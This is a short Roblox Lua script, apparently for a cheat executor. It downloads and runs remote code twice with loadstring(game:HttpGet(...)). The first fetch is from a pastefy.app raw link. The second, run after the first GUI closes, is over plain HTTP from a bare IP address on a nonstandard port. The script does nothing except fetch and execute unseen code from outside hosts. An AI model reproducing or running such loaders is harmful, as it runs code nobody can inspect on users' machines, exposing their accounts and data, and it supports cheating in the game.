-- Load GUI 1 (task)
loadstring(game:HttpGet("https://pastefy.app/X6cMDfBA/raw"))()

local player = game.Players.LocalPlayer
local gui = player:WaitForChild("PlayerGui")

-- WAIT until GUI 1 is removed
repeat
    task.wait()
until #gui:GetChildren() == 0 
   or not gui:FindFirstChildWhichIsA("ScreenGui")

-- Load GUI 2 after task completion
loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
